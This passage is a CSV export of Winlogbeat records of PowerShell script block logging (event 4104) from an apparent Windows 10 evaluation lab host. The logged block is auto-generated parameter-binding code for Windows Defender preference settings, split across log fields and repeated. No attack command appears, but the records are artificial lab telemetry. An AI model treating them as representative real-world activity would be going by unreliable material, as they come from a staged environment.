        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableScanningNetworkFiles')) {
          [object]$__cmdletization_value = ${DisableScanningNetworkFiles}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('UILockdown')) {
          [object]$__cmdletization_value = ${UILockdown}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {
          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {
          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('UnknownThreatDefaultAction')) {
          [object]$__cmdletization_value = ${UnknownThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LowThreatDefaultAction')) {
          [object]$__cmdletization_value = ${LowThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ModerateThreatDefaultAction')) {
          [object]$__cmdletization_value = ${ModerateThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletizat",6,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3335,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",ZXkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.204",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (7 of 20):
ion.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('HighThreatDefaultAction')) {
          [object]$__cmdletization_value = ${HighThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SevereThreatDefaultAction')) {
          [object]$__cmdletization_value = ${SevereThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Force')) {
          [object]$__cmdletization_value = ${Force}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableBlockAtFirstSeen')) {
          [object]$__cmdletization_value = ${DisableBlockAtFirstSeen}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PUAProtection')) {
          [object]$__cmdletization_value = ${PUAProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('CloudBlockLevel')) {
          [object]$__cmdletization_value = ${CloudBlockLevel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('CloudExtendedTimeout')) {
          [object]$__cmdletization_value = ${CloudExtendedTimeout}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableNetworkProtection')) {
          [object]$__cmdletization_value = ${EnableNetworkProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableControlledFolderAccess')) {
          [object]$__cmdletization_value = ${EnableControlledFolderAccess}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {
          [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {
          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent =

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","ion.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('HighThreatDefaultAction')) {
          [object]$__cmdletization_value = ${HighThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SevereThreatDefaultAction')) {
          [object]$__cmdletization_value = ${SevereThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Force')) {
          [object]$__cmdletization_value = ${Force}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableBlockAtFirstSeen')) {
          [object]$__cmdletization_value = ${DisableBlockAtFirstSeen}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PUAProtection')) {
          [object]$__cmdletization_value = ${PUAProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('CloudBlockLevel')) {
          [object]$__cmdletization_value = ${CloudBlockLevel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('CloudExtendedTimeout')) {
          [object]$__cmdletization_value = ${CloudExtendedTimeout}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableNetworkProtection')) {
          [object]$__cmdletization_value = ${EnableNetworkProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableControlledFolderAccess')) {
          [object]$__cmdletization_value = ${EnableControlledFolderAccess}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {
          [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
